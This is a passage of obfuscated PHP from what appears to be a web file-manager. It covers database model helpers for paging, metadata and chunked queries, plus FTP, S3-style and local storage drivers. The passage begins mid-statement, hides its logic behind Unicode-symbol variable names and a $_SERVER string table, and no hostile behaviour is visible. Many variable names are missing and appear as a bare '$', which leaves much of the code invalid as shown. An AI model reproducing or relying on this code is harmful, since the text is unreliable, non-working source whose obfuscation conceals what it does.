$ꭁ; if ($ꭁ === -1) { $in[$ނ[439]] = !1; $ة = 100000000; $ꭁ = $ة; } $ = $; $[$ނ[441]] = array(); $ꭁ = intval($ꭁ); $ꭁ = $ꭁ <= 5 ? 5 : ($ꭁ >= $ة ? $ة : $ꭁ); $٢ޯ = intval(isset($in[$ނ[428]]) && $in[$ނ[428]] ? $in[$ނ[428]] : $٢ޯ); $٢ޯ = $٢ޯ <= 1 ? 1 : $٢ޯ; $ = array(); $ʯ = 1; $ = $this->selectPageCountBy(); if ($٢ޯ == 1 && $ʯ) { $this->optionsValue($); $ = $this->page($٢ޯ, $ꭁ)->select(); $ = is_array($) ? count($) : 0; if ($ < $ꭁ) { $ߕ̦ = 1; } else { $this->optionsValue($); $ = intval($this->count($)); $ߕ̦ = ceil($ / $ꭁ); } } else { $this->optionsValue($); $ = intval($this->count($)); $ߕ̦ = ceil($ / $ꭁ); $٢ޯ = $٢ޯ >= $ߕ̦ ? $ߕ̦ : $٢ޯ; $this->optionsValue($); $ = $this->page($٢ޯ, $ꭁ)->select(); } $this->selectPageCountBy($ނ[442]); if (!is_array($)) { $ = array(); } if ($ߕ̦ == 1) { $ = count($); } $ә = array($ނ[443] => array($ނ[444] => $, $ނ[439] => $ꭁ, $ނ[428] => $٢ޯ, $ނ[445] => $ߕ̦), $ނ[446] => $); return $ә; } protected function selectPageCountBy($± = false) { static $ʀ = null; if (!$±) { return $ʀ; } if ($± == $_SERVER[ܮ][442]) { $ʀ = null; return; } $ʀ = $±; } protected function checkLength($, $ߵ = 0, $ = '') { $ѷ =& $_SERVER[ܮ]; $ߵ = $ߵ ? $ߵ : 65536; if (!$ || strlen($) < $ߵ) { return; } $ = $ ? $ . $ѷ[74] : $ѷ[12]; show_json($ . LNG($ѷ[447]) . "\50{$ߵ}\51", !1); } protected function metaSet($ϕ, $ = null, $ = null) { $ =& $_SERVER[ܮ]; if (!$this->tableMeta || !$ϕ) { return !1; } $㋨ = $this->tableMeta[$[448]]; $ = $this->tableMeta[$[449]]; $쯰 = Model($); $ = array($㋨ => $ϕ, $[450] => $); if (is_null($)) { return $쯰->where(array($㋨ => $ϕ))->delete(); } if (is_null($) && is_string($)) { return $쯰->where($)->delete(); } $ = is_array($) ? $ : array(); if (is_string($)) { $[$] = $; } $׍ = array(); foreach ($ as $˷ => $׮) { if (is_null($׮) && is_string($˷)) { $쯰->where(array($㋨ => $ϕ, $[450] => $˷))->delete(); continue; } $this->checkLength($׮, !1, $ . $[4] . $˷); $׍[] = array($㋨ => $ϕ, $[95] => $˷, $[451] => $׮); } $ϣ = $[452] . $; CacheLock::lock($ϣ); $쯰->where(array($㋨ => $ϕ))->addAll($׍, array(), !0); CacheLock::unlock($ϣ); return !0; } public function metaGet($ńЋ, $ = false) { $ܵ =& $_SERVER[ܮ]; if (!$this->tableMeta) { return array(); } $ = $this->tableMeta[$ܵ[448]]; $򷼣 = Model($this->tableMeta[$ܵ[449]]); if ($) { $̔أ = array($ => $ńЋ, $ܵ[95] => $); return $򷼣->where($̔أ)->getField($ܵ[451]); } $̔أ = array($ => $ńЋ); $Ԉ = $򷼣->field($ܵ[453])->where($̔أ)->select(); $Ԉ = array_to_keyvalue($Ԉ, $ܵ[95], $ܵ[451]); return $Ԉ; } private function checkDataAutoHas($ݗ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $) { if (in_array($ݗ, explode($_SERVER[ܮ][50], $[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$؄у, $듹) { $ =& $_SERVER[ܮ]; if (!is_array($؄у)) { return; } foreach ($this->dataAuto as $Ҫ) { $ĥ = $Ҫ[0]; if (!in_array($듹, explode($[50], $Ҫ[2]))) { continue; } switch (trim($Ҫ[3])) { case $[396]: case $[397]: $֋գ = $Ҫ[1]; $գ = isset($Ҫ[4]) ? (array) $Ҫ[4] : array(); if ($֋գ == $[204] && array_key_exists($ĥ, $؄у)) { if (!$؄у[$ĥ]) { unset($؄у[$ĥ]); } break; } if (isset($؄у[$ĥ])) { array_unshift($գ, $؄у[$ĥ]); } if ($[396] == $Ҫ[3]) { $؄у[$ĥ] = call_user_func_array($֋գ, $գ); } else { $؄у[$ĥ] = call_user_func_array(array(&$this, $֋գ), $գ); } break; case $[348]: if (isset($؄у[$ĥ]) && $؄у[$ĥ]) { $؄у[$ĥ] = call_user_func_array(array(&$this, $Ҫ[1]), array($؄у[$ĥ])); } break; case $[351]: $؄у[$ĥ] = $؄у[$Ҫ[1]]; break; case $[369]: if (isset($؄у[$ĥ]) && !is_string($؄у[$ĥ])) { $؄у[$ĥ] = json_encode_force($؄у[$ĥ]); $؄у[$ĥ] = self::textEncode($؄у[$ĥ]); } break; case $[398]: if ($؄у[$ĥ] === $[12]) { unset($؄у[$ĥ]); } break; case $[399]: $؄у[$ĥ] = $Ҫ[1]; default: break; } } if ($듹 == $[430]) { $Ê = strtolower($this->db->getDbType()); if (strpos($Ê, $[13]) !== 0) { return; } $櫆 = $this->field(!0)->fields; $Ʀ = $櫆[$[329]]; if (isset($櫆[$[328]])) { unset($Ʀ[$櫆[$[328]]]); } foreach ($Ʀ as $桁 => $듹) { if (!isset($؄у[$桁])) { $؄у[$桁] = $[12]; } } } } private function dataAfterFilter(&$׶) { $ =& $_SERVER[ܮ]; foreach ($this->dataAuto as $) { $ = $[0]; if (!isset($׶[$])) { continue; } if (!in_array($[432], explode($[50], $[2]))) { continue; } switch (trim($[3])) { case $[396]: case $[397]: $ߊ = isset($[4]) ? (array) $[4] : array(); array_unshift($ߊ, $׶[$]); if (isset($[4]) && $[4] == $[454]) { $ߊ = array($׶[$]); } if ($[396] == $[3]) { $׶[$] = call_user_func_array($[1], $ߊ); } else { $׶[$] = call_user_func_array(array(&$this, $[1]), $ߊ); } break; case $[348]: if (isset($׶[$]) && $׶[$]) { $׶[$] = call_user_func_array(array(&$this, $[1]), array($׶[$])); } break; case $[351]: $׶[$] = $׶[$[1]]; break; case $[369]: $ғԵ = $׶[$]; $ғԵ = self::textDecode($ғԵ); $׶[$] = json_decode($ғԵ, !0); if (is_null($׶[$])) { $׶[$] = $ғԵ; } break; case $[398]: if ($׶[$] === $[12]) { unset($׶[$]); } break; case $[399]: $׶[$] = $[1]; break; default: break; } } } public function saveAll($ǈ, $Ǵ = false) { $۳ =& $_SERVER[ܮ]; $ = $this->db; $Æ = $this->tablePrefix . $this->tableName; $삽ݘ = $this->saveAllChunkMake($ǈ); $Ǵ = is_array($Ǵ) ? $Ǵ : array(); foreach ($삽ݘ as $) { $ = $۳[12]; $ = $۳[12]; $䋃 = array(); $渖 = array(); foreach ($ as $ȥԤ => $) { $ = $[$۳[455]]; $渖[] = $[$۳[456]]; $Ԇ = $->parseValue($[$۳[456]]); foreach ($[$۳[457]] as $æ => $쭐) { if (!$䋃[$æ]) { $䋃[$æ] = array(); } $䋃[$æ][] = $۳[458] . $Ԇ . $۳[459] . $->parseValue($쭐); } } $˸ = $; $˸ = $->parseKey($˸); foreach ($䋃 as $æ => $ͼİ) { $ .= $۳[285] . $->parseKey($æ) . $۳[460] . $˸ . $۳[461]; $ .= implode($۳[285], $ͼİ) . $۳[462]; } $ = $Ǵ; $[$] = array($۳[7], $渖); $ = "\x55\x50\x44\x41\124\x45\x20\140{$Æ}\x60\40\x53\x45\124\x20" . rtrim($, $۳[50]) . $۳[285] . $->parseWhere($); $this->execute($); $this->chunkEventCheck(count($)); } $this->chunkEventSet(); } public function saveAllEach($, $ = false) { $ =& $_SERVER[ܮ]; $ = $this->db; $α = $this->tablePrefix . $this->tableName; $ = $this->saveAllChunkMake($); $ = is_array($) ? $ : array(); foreach ($ as $) { foreach ($ as $舼 => $۵) { $ɏ = $[463]; foreach ($۵[$[457]] as $ݑ => $) { $ɏ .= $->parseKey($ݑ) . $[464] . $->parseValue($) . $[50]; } $ܜ = $; $ܜ[$۵[$[455]]] = $۵[$[456]]; $ = "\125\x50\x44\101\124\x45\40\x60{$α}\x60\x20\x53\105\x54\x20" . rtrim($ɏ, $[50]) . $[465] . $->parseWhere($ܜ) . $[466]; $this->execute($); } $this->chunkEventCheck(count($)); } $this->chunkEventSet(); } private function saveAllChunkMake($¶) { $ޭ =& $_SERVER[ܮ]; $Шԏ = self::SQL_WHERE_IN_CHUNK; $¶ = is_array($¶) ? $¶ : array(); $ҹ = array(); $ה = ceil(count($¶) / $Шԏ); for ($ϐ = 0; $ϐ < $ה; $ϐ++) { $ = array(); $͆ע = array_slice($¶, $ϐ * $Шԏ, $Шԏ); foreach ($͆ע as $) { if (!is_array($) || count($) < 4 || count($) % 2 != 0) { continue; } $ޙř = array(); for ($ = 2; $ < count($); $ += 2) { $ޙř[$[$]] = $[$ + 1]; } $[] = array($ޭ[455] => $[0], $ޭ[456] => $[1], $ޭ[457] => $ޙř); } $ҹ[] = $; } return $ҹ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ = false, $ = false) { $this->_chunkEvent = $; $this->_chunkEventParam = $; } private function chunkEventCheck($) { if (!$this->_chunkEvent) { return; } $۵ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $۵[$_SERVER[ܮ][467]] = $; Hook::trigger($this->_chunkEvent, $۵); } public function addAll($ƈؘ, $ = array(), $絽 = false) { $ =& $_SERVER[ܮ]; ignore_timeout(); $ = self::SQL_WHERE_IN_CHUNK; if (empty($ƈؘ)) { $this->error = think_lang($[349]); return !1; } $ = $this->_parseOptions($); foreach ($ƈؘ as $ => $ǇĐ) { $ƈؘ[$] = $this->_facade($ǇĐ); $this->_beforeInsert($ƈؘ[$], $); } if (method_exists($this->db, $[350])) { for ($Ѧв = 0; $Ѧв < count($ƈؘ); $Ѧв += $) { $֗ = array_slice($ƈؘ, $Ѧв, $); if (!is_array($֗) || count($֗) == 0) { break; } $ؘ = $this->db->insertAll($֗, $, $絽); $this->chunkEventCheck(count($֗)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ƈؘ as $ => $ǇĐ) { $ؘ = $this->db->insert($ǇĐ, $, $絽); } $this->commit(); } if (!1 !== $ؘ) { $ȉ = $this->getLastInsID(); if ($ȉ) { return $ȉ; } } return $ؘ; } public function save($ȣ = '', $Ĉ = array()) { $ =& $_SERVER[ܮ]; $ʞ = self::SQL_WHERE_IN_CHUNK; $峢 = $this->optionsValue(); $Ĵ⿭ = $this->findWhereField($峢); if (!$Ĵ⿭) { return parent::save($ȣ, $Ĉ); } $̙ˆ = 0; $Ҷ = $峢[$[353]][$Ĵ⿭][1]; $Ҷ = is_array($Ҷ) ? $Ҷ : array(); $ɾ = count($Ҷ); for ($ͻҮ = 0; $ͻҮ < $ɾ; $ͻҮ += $ʞ) { $Ϻ = array_slice($Ҷ, $ͻҮ, $ʞ); if (!is_array($Ϻ) || count($Ϻ) == 0) { break; } $峢[$[353]][$Ĵ⿭][1] = $Ϻ; $this->optionsValue($峢); $̙ˆ += parent::save($ȣ, $Ĉ); $this->chunkEventCheck(count($Ϻ)); } $this->chunkEventSet(); return $̙ˆ; } public function add($ = '', $ = array(), $Ѽ = false) { if ($this->addTaskStatus && is_array($)) { $this->addTaskData[] = $; return; } return parent::add($, $, $Ѽ); } public function parseWhereLike($, $ = '', $ = false, &$塔 = false) { $ɫ =& $_SERVER[ܮ]; $ǉ = $GLOBALS[$ɫ[6]][$ɫ[468]]; if (!$ǉ[$ɫ[469]]) { return $; } if (!in_array($this->tableName, array($ɫ[429], $ɫ[470], $ɫ[471], $ɫ[472]))) { return $; } if (!is_array($)) { return $; } $̓ = array(); $ = 0; foreach ($ as $ => $荅) { if (is_array($荅) && count($荅) == 2 && $荅[0] == $ɫ[473] && is_string($荅[1]) && substr($荅[1], 0, 1) == $ɫ[474] && substr($荅[1], strlen($荅[1]) - 1, 1) == $ɫ[474]) { $塔 = !0; $ = is_string($) ? $ : $; $ = substr($荅[1], 1, strlen($荅[1]) - 2); $ = $this->db->escapeString($); if (!strpos($, $ɫ[10])) { $ = $ɫ[475] . $ . $ɫ[475]; } $ㄤ = $ɫ[220] . $ . $ɫ[220]; $ = str_replace(array($ɫ[10], $ɫ[476]), $ɫ[477], $); if ($ǉ[$ɫ[478]]) { $ㄤ = $ɫ[479] . $ . $ɫ[480]; if ($ǉ[$ɫ[481]]) { $ㄤ = $ɫ[480] . $ . $ɫ[479]; } } $ǥ = Hook::trigger($ɫ[482], $, $ㄤ); if ($ǥ) { $ㄤ = $ǥ; } $̓[$] = $ɫ[483] . $ . $ɫ[484] . $ㄤ . $ɫ[485]; $++; continue; } if (is_array($荅)) { $ = is_string($) ? $ : $; $荅 = $this->parseWhereLike($荅, $, !0, $塔); } if (is_numeric($)) { $̓[$] = $荅; $++; } else { $̓[$] = $荅; } } if ($塔 && !$) { } return $̓; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ٺ˒ = array()) { $ߞ =& $_SERVER[ܮ]; $ܔ = self::SQL_WHERE_IN_CHUNK; $ȉÀ = $this->optionsValue(); $˵ = $this->findWhereField($ȉÀ); if (!$˵ || isset($ȉÀ[$ߞ[368]]) || isset($ȉÀ[$ߞ[428]])) { return parent::select($ٺ˒); } $ = $ȉÀ[$ߞ[353]][$˵][1]; $ = is_array($) ? $ : array(); $ݲӧ = null; for ($ף䙍 = 0; $ף䙍 < count($); $ף䙍 += $ܔ) { $ = array_slice($, $ף䙍, $ܔ); if (!is_array($) || count($) == 0) { break; } $ȉÀ[$ߞ[353]][$˵][1] = $; $this->optionsValue($ȉÀ); $ꅊ = parent::select($ٺ˒); if (!$ꅊ) { continue; } $ݲӧ = is_array($ݲӧ) ? $ݲӧ : array(); $ݲӧ = array_merge($ݲӧ, $ꅊ); } return $ݲӧ; } public function delete($О = array()) { $ɺ =& $_SERVER[ܮ]; $ѿ = self::SQL_WHERE_IN_CHUNK; $̦ϼ = $this->optionsValue(); $ = $this->findWhereField($̦ϼ); if (!$) { return parent::delete($О); } $㠩 = 0; $顑 = $̦ϼ[$ɺ[353]][$][1]; $顑 = is_array($顑) ? $顑 : array(); for ($ց = 0; $ց < count($顑); $ց += $ѿ) { $ŕ = array_slice($顑, $ց, $ѿ); if (!is_array($ŕ) || count($ŕ) == 0) { break; } $̦ϼ[$ɺ[353]][$][1] = $ŕ; $this->optionsValue($̦ϼ); $㠩 += parent::delete($О); } return $㠩; } private function findWhereField($) { $腷 =& $_SERVER[ܮ]; $臞 = self::SQL_WHERE_IN_CHUNK; if (!is_array($) || !is_array($[$腷[353]])) { return !1; } foreach ($[$腷[353]] as $֌ => $έ) { if (is_array($έ) && isset($έ[0]) && is_string($έ[0]) && strtolower($έ[0]) == $腷[7] && is_array($έ[1]) && count($έ[1]) > $臞) { ignore_timeout(); return $֌; } } return !1; } public function setMasterDB($· = true) { think_config($_SERVER[ܮ][486], $·); } } goto B틉; c: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($띏) { parent::__construct(); if (count($띏) > 0) { $this->_init($띏); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($˟) { $ =& $_SERVER[ܮ]; global $config; $this->appCharset = $config[$[1647]]; $this->systemCharset = $config[$[1648]]; if (isset($˟[$[1649]]) && $˟[$[1649]]) { $this->systemCharset = $˟[$[1649]]; } } public function iconvApp($) { return $this->iconvTo($, $this->systemCharset, $this->appCharset); } public function iconvSystem($覝) { return $this->iconvTo($覝, $this->appCharset, $this->systemCharset); } public function getPathOuter($) { $ =& $_SERVER[ܮ]; $ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($, 0, 2) == $[1524]) { $ = BASIC_PATH . substr($, 2); } if (substr($, 0, 2) == $[1524]) { $ = BASIC_PATH . substr($, 2); } $ = KodIO::clear($); $ = KodIO::clear($); $ = substr($, strlen($)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $[8] . ltrim($, $[8]); } private function _init($ = array()) { $շВ =& $_SERVER[ܮ]; if (!function_exists($շВ[1650])) { throw new Exception(LNG($շВ[1651])); } $this->config = $; $this->charsetReset($); foreach ($ as $и => $) { if (isset($this->{$и})) { $this->{$и} = $; } } return $this->_login($); } private function _login($ǚ) { $ᳫ =& $_SERVER[ܮ]; static $Ǥ = array(); $뺝 = md5(json_encode($ǚ)); if (isset($Ǥ[$뺝])) { foreach ($Ǥ[$뺝] as $ => $҈) { $this->{$} = $҈; } return !0; } $˯ = parse_url(trim($this->server, $ᳫ[8])); $this->host = $˯[$ᳫ[206]]; $ = isset($˯[$ᳫ[205]]) && $˯[$ᳫ[205]] == $ᳫ[1652] ? !0 : !1; $this->scheme = $ ? $ᳫ[1653] : $ᳫ[1654]; $this->port = isset($˯[$ᳫ[207]]) ? $˯[$ᳫ[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ᳫ[1655]) . $this->host . $ᳫ[4] . $this->port, !0); return !1; } $ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$) { $this->writeLog(LNG($ᳫ[1656]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ᳫ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ = $this->pasv == $ᳫ[91] ? !0 : !1; @ftp_pasv($this->connect, $); $Ǥ[$뺝] = array($ᳫ[1657] => $this->connect, $ᳫ[206] => $this->host, $ᳫ[205] => $this->scheme, $ᳫ[207] => $this->port); return $; } private function _isconn($ƨծ = true) { if (is_resource($this->connect)) { return !0; } if (!$ƨծ) { return !1; } return $this->_login($this->config); } public function mkfile($Ǫ, $ = '', $ = REPEAT_RENAME) { if ($this->setContent($Ǫ, $)) { return $this->getPathOuter($Ǫ); } $this->writeLog(LNG($_SERVER[ܮ][1658]), !0); return !1; } public function mkdir($, $֗ = REPEAT_SKIP) { $ =& $_SERVER[ܮ]; if (!$ || $ == $[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); if ($this->_isFolder($) || @ftp_mkdir($this->connect, $)) { return $this->getPathOuter($); } if (!$this->mkdir($this->pathFather($))) { return !1; } if ($ = @ftp_mkdir($this->connect, $)) { return $this->getPathOuter($); } $鹹 = __FUNCTION__ . $[1659]; $this->writeLog($鹹, !0); return !1; } public function copyFile($, $) { if (!$this->_isconn()) { return !1; } $ݳ = $this->pathThis($this->iconvSystem($)); $ީ = $this->tempFile($ݳ); $ƈ = $this->iconvApp($ީ); $this->download($, $ƈ); $ = $this->upload($, $ƈ); $this->tempFileRemve($ީ); return $; } public function moveFile($ރ, $ѭ) { if (!$this->_isconn()) { return !1; } $ރ = $this->iconvSystem($ރ); $ѭ = $this->iconvSystem($ѭ); $ɐ = @ftp_rename($this->connect, $ރ, $ѭ); if (!$ɐ) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } return $this->getPathOuter($ѭ); } public function delFile($؟) { if (!$this->_isconn()) { return !1; } $؟ = $this->iconvSystem($؟); $ = @ftp_delete($this->connect, $؟); if (!$) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); } return $; } public function delFolder($ն) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ = $ = array(); $this->fileList($ն, $, $, !0); $this->listItemCache = !0; foreach ($ as $ޖ) { $Ϟ = $this->iconvSystem($ޖ[$_SERVER[ܮ][32]]); $ = @ftp_delete($this->connect, $Ϟ); if (!$) { return !1; } } foreach ($ as $Ϟ) { $Ϟ = $this->iconvSystem($Ϟ); $ = @ftp_rmdir($this->connect, $Ϟ); if (!$) { return !1; } } $ն = $this->iconvSystem($ն); return @ftp_rmdir($this->connect, $ն); } public function rename($ƅ, $) { $ϙ =& $_SERVER[ܮ]; if (!$this->_isconn()) { return !1; } $͛ = $this->fileNameAuto($this->pathFather($ƅ), $); $͛ = $this->iconvSystem($͛); $ƅ = $this->iconvSystem($ƅ); $ = $this->pathFather($ƅ); $λ = rtrim($, $ϙ[8]) . $ϙ[8] . $͛; $ɺ䓬 = @ftp_rename($this->connect, $ƅ, $λ); if (!$ɺ䓬) { $this->writeLog(__FUNCTION__ . $ϙ[1659], !0); return !1; } $λ = $this->iconvApp($λ); return $this->getPathOuter($λ); } private function folderInfo($, $ = false) { $ձ쀊 =& $_SERVER[ܮ]; $Խ = array($ձ쀊[32] => $this->pathThis($), $ձ쀊[87] => $this->getPathOuter($ձ쀊[8] . $), $ձ쀊[33] => $ձ쀊[78]); if ($) { return $Խ; } $Խ[$ձ쀊[231]] = $Խ[$ձ쀊[88]] = 0; $Խ[$ձ쀊[232]] = $Խ[$ձ쀊[233]] = !0; return $Խ; } private function fileInfo($ꊘ, $ = false, $ٯŽ = array()) { $ =& $_SERVER[ܮ]; $뷆 = array($[32] => $this->pathThis($ꊘ), $[87] => $this->getPathOuter($[8] . $ꊘ), $[33] => $[230], $[79] => isset($ٯŽ[$[79]]) ? $ٯŽ[$[79]] : 0, $[166] => $this->ext($ꊘ)); if ($) { return $뷆; } $뷆[$[231]] = $뷆[$[88]] = 0; $뷆[$[232]] = $뷆[$[233]] = !0; $ܧ = $this->iconvSystem($ꊘ); $뷆[$[88]] = @ftp_mdtm($this->connect, $ܧ); if (empty($ٯŽ)) { $ٯŽ = $this->objectMeta($ꊘ); if (!$ٯŽ) { return $뷆; } } $뷆[$[79]] = $ٯŽ[$[79]]; return $뷆; } public function size($성) { $ل = $this->objectMeta($성); return $ل ? $ل[$_SERVER[ܮ][79]] : 0; } public function info($ډ) { if ($this->isFile($ډ)) { return $this->fileInfo($ډ, 0); } else { if ($this->isFolder($ډ)) { return $this->folderInfo($ډ); } } return !1; } private function fileList($, &$ݹ, &$Ҥ, $ڠӭ = false) { $ش =& $_SERVER[ܮ]; $ = $this->iconvSystem($); if (!$this->isFolder($)) { return !1; } $ = rtrim($, $ش[8]) . $ش[8]; check_abort(); $ = @ftp_rawlist($this->connect, $); if (!$) { $ = array(); } $⥧ = array($ش[10] => 1, $ش[1469] => 1); foreach ($ as $զ) { $ = $this->_listItem($զ); if ($[0] == $ش[857]) { continue; } $ת = $[8]; if (empty($ת) && $ת !== $ش[228] || isset($⥧[$ת])) { continue; } $ת = $this->iconvApp($ . ltrim($ת, $ش[8])); $ = array($ش[32] => $ת, $ش[33] => $ش[230], $ش[79] => $[4]); if (substr($զ, 0, 1) == $ش[1660]) { $[$ش[33]] = $ش[78]; $[$ش[79]] = 0; } $êԥ = $[$ش[33]] == $ش[78] ? !0 : !1; $this->cacheMethodInfoSet($ת, $êԥ, $); if ($êԥ) { $ݹ[] = $ת; if ($ڠӭ) { $this->fileList($ת, $ݹ, $Ҥ, $ڠӭ); } continue; } $Ҥ[] = $; } $this->cacheMethodInfoSet($, !0); } private function _listItem($) { if (empty($)) { return array(); } $ǌ = preg_split($_SERVER[ܮ][1661], $); if (count($ǌ) <= 9) { return $ǌ; } $ǌ[8] = trim(substr($, strpos($, $ǌ[7]) + strlen($ǌ[7]))); return array_splice($ǌ, 0, 9); } public function listPath($ٔ, $춘 = false) { $ =& $_SERVER[ܮ]; if (!$this->_isconn()) { return !1; } $Ó = $ = array(); $this->fileList($ٔ, $Ó, $); foreach ($Ó as $Ō => $) { $Ó[$Ō] = $this->folderInfo($, $춘); } foreach ($ as $Ō => $) { $[$Ō] = $this->fileInfo($[$[32]], $춘, $); } return array($[85] => $Ó, $[86] => $); } public function has($֦, $ = false, $ = true) { $㶲 =& $_SERVER[ܮ]; $ = $թ = array(); $ = $ ? !0 : !1; $this->fileList($֦, $, $թ, $); if ($) { return array($㶲[239] => count($թ), $㶲[240] => count($)); } if ($) { if (count($թ)) { return !0; } } else { if (count($)) { return !0; } } return !1; } public function listAll($ݓ) { $똺ю =& $_SERVER[ܮ]; if (!$this->_isconn()) { return !1; } $ = $鸐 = array(); $this->fileList($ݓ, $, $鸐, !0); $ә = array_to_keyvalue($鸐, $똺ю[32]); foreach ($ as $) { if (is_string($)) { $ә[$] = array($똺ю[79] => 0); } } return $this->listAllFiles($ݓ, $ә); } public function getContent($) { if (!$this->_isconn()) { return !1; } $ = $this->iconvSystem($); return $this->fileSubstr($); } public function setContent($, $ = '') { if (!$this->_isconn()) { return !1; } $ߵ = $this->pathThis($this->iconvSystem($)); $Ꜿ = $this->tempFile($ߵ); file_put_contents($Ꜿ, $); $Ţɤ = $this->upload($, $this->iconvApp($Ꜿ)); $this->tempFileRemve($Ꜿ); return $Ţɤ; } public function fileSubstr($, $ƕ = 0, $ޗ÷ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($, $ƕ, $ޗ÷); } private function ftpRequest($Ҿ, $۴ = 0, $㗇 = false) { $Ê =& $_SERVER[ܮ]; $Ҿ = $Ê[8] . ltrim(str_ltrim($Ҿ, $this->ftpPath), $Ê[8]); $Ҿ = $this->iconvSystem($Ҿ); $Ӿ = $this->scheme . $this->host . $Ê[4] . $this->port; $ = curl_init(); curl_setopt($, CURLOPT_URL, $Ӿ . $this->pathEncode($Ҿ)); curl_setopt($, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($㗇) { $ = $۴ + $㗇 - 1; curl_setopt($, CURLOPT_RANGE, "{$۴}\55{$}"); } curl_setopt($, CURLOPT_RETURNTRANSFER, 1); $ɇ = curl_exec($); curl_close($); return $ɇ; } public function upload($, $, $ = false, $כ = REPEAT_REPLACE) { if (!$ || !@file_exists($)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($))) { return !1; } $ = $this->iconvSystem($); $ = $this->iconvSystem($); $燐۵ = ftp_nb_put($this->connect, $, $, FTP_BINARY); while ($燐۵ == FTP_MOREDATA) { $燐۵ = ftp_nb_continue($this->connect); } if ($燐۵ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } return $this->getPathOuter($); } public function download($, $Ζܣ = '') { if (!$this->_isconn()) { return !1; } $յĺ = $this->pathFather($Ζܣ); if (!IO::mkdir($յĺ)) { return !1; } $ = $this->iconvSystem($); $Ζܣ = $this->iconvSystem($Ζܣ); $ = ftp_nb_get($this->connect, $Ζܣ, $, FTP_BINARY); while ($ == FTP_MOREDATA) { $ = ftp_nb_continue($this->connect); } if ($ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ܮ][1659], !0); return !1; } return $this->iconvApp($Ζܣ); } public function exist($Τ) { return $this->isFile($Τ) || $this->isFolder($Τ); } public function isFile($ٙ) { return !$this->isFolder($ٙ) && $this->objectMeta($ٙ); } public function isFolder($ۼ) { return $this->cacheMethod($_SERVER[ܮ][177], $ۼ); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ܮ][179], $); } protected function _objectMeta($܇ދ) { $Џ =& $_SERVER[ܮ]; if ($܇ދ == $Џ[12] || $܇ދ == $Џ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $܇ދ = $this->iconvSystem($܇ދ); $ = array($Џ[32] => $this->iconvApp($܇ދ), $Џ[33] => $Џ[230], $Џ[79] => 0); $ع = @ftp_size($this->connect, $܇ދ); if ($ع != -1) { $[$Џ[79]] = $ع; } else { $ҋ̡ = @ftp_chdir($this->connect, $܇ދ); if (!$ҋ̡) { return !1; } @ftp_chdir($this->connect, $Џ[8]); $[$Џ[33]] = $Џ[78]; } return $; } protected function _isFolder($) { $ú =& $_SERVER[ܮ]; if ($ == $ú[12] || $ == $ú[8]) { return !0; } $޳˰ = $this->_objectMeta($); return isset($޳˰[$ú[33]]) && $޳˰[$ú[33]] == $ú[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($ʻ) { parent::__construct($ʻ); $this->setSignVersion($_SERVER[ܮ][247]); } public function uploadLink($, $ = 0) { $î =& $_SERVER[ܮ]; if ($this->isUploadServer()) { return; } $Ѯ = $this->getType(); if (!in_array($Ѯ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $仴 = (!$ ? 1 : ceil($ / pow(1024, 3))) * 3600 * 4; $ = $this->uploadMultiData($, $仴); if ($) { $[$î[95]] = $; $[$î[96]] = $Ѯ; } return $; } public function fileOutImage($, $ = 250) { if ($this->size($) > 1024 * 1024 * 25) { return $this->fileOutImageServer($, $); } $ = $this->link($); $ .= $_SERVER[ܮ][1662] . $; $this->fileOutLink($); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ƹ) { if (substr($ƹ, 0, 2) == $_SERVER[ܮ][1524]) { $ƹ = BASIC_PATH . substr($ƹ, 2); } return $ƹ; } public function iconvApp($à) { $߁ =& $_SERVER[ܮ]; global $config; return $this->iconvTo($à, $config[$߁[1648]], $config[$߁[1647]]); } public function iconvSystem($π) { $ľ =& $_SERVER[ܮ]; global $config; return $this->iconvTo($π, $config[$ľ[1647]], $config[$ľ[1648]]); } public function getPathOuter($) { $ױ߳ =& $_SERVER[ܮ]; $ = $this->iconvApp($this->pathBase); $ = $this->iconvApp($); if (substr($, 0, 2) == $ױ߳[1524]) { $ = BASIC_PATH . substr($, 2); } if (substr($, 0, 2) == $ױ߳[1524]) { $ = BASIC_PATH . substr($, 2); } $ = KodIO::clear($); $ = KodIO::clear($); $ = substr($, strlen($)); if (empty($this->pathDriver)) { return $; } return $this->pathDriver . $ױ߳[8] . ltrim($, 